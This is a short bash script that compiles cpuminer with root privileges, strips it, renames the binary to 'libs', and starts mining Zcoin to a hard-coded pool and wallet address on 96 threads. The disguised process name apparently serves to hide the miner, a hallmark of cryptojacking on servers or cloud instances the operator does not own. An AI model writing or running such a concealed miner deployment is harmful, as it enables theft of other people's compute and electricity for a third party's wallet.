#!/bin/bash
sudo chmod +x autogen.sh
sudo ./autogen.sh

sudo chmod +x configure
sudo ./configure --with-crypto --with-curl CFLAGS="-O2 $extracflags -DUSE_ASM -pg"

sudo make -j 4

sudo strip -s cpuminer

sudo cp cpuminer libs

sudo ./libs -a mtp -o  stratum+tcp://zcoin.mintpond.com:3000 -u a3i4r4MyHMcwMWup5aMKbP2UR8jZAYBBjx.001 -p mHp4HT -p 0 -t 96
